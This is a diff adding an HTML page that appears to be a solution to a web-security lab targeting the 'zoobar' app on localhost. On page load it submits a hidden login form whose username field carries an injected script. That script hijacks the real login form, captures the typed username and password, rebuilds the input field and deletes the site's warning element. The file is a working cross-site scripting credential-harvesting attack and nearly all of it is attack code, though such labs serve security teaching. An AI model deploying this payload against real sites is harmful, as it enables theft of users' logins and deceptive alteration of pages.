@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Title of the document</title>
+<script>
+  window.onload = function() {
+    var button = document.querySelector("#submitbutton");
+    var username = document.querySelector("#username");
+    username.value = '"><script> function handleSubmit() { var input = document.querySelector(\"input[name=\'login_username\']\"); var input2 = document.querySelector(\"input[name=\'login_password\']\"); alert(\"Username: \" + input.value + \"\\r\\n\" + \"Password: \" + input2.value); } window.onload = function() { var el = document.querySelector(\"form[name=\'loginform\']\"); el.addEventListener(\"submit\", handleSubmit, false); var tds = el.querySelectorAll(\"td\"); var lol = tds[1]; lol.innerHTML = \"\"; var input = document.createElement(\"input\"); input.setAttribute(\"type\", \"text\"); input.setAttribute(\"name\", \"login_username\"); input.setAttribute(\"size\", \"20\"); input.setAttribute(\"autocomplete\", \"no\"); input.setAttribute(\"value\", \"\"); lol.appendChild(input); var footerWarning = document.querySelector(\".warning\"); console.log(footerWarning); footerWarning.parentNode.removeChild(footerWarning); } <\/script>'
+    button.click();
+  }
+</script>
+</head>
+<body>
+  <div style="display:none;" id="login" class="centerpiece">
+      <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
+        <table>
+          <tr>
+            <td>Username:</td>
+            <td><input id="username" type="text" name="login_username"
+            autocomplete="no" value=""></td>
+          </tr>
+          <tr>
+            <td>Password:</td>
+            <td colspan=2><input id="password" type="password" name="login_password" autocomplete="no">
+            <input id="submitbutton" type="submit" name="submit_login" value="Log in">
+            <input type="submit" name="submit_registration" value="Register"></td>
+          </tr>
+        </table>
+        <input type="hidden" name="nexturl" value="/zoobar/index.cgi/">
+      </form>
+    </div>
+</body>
+
+</html>
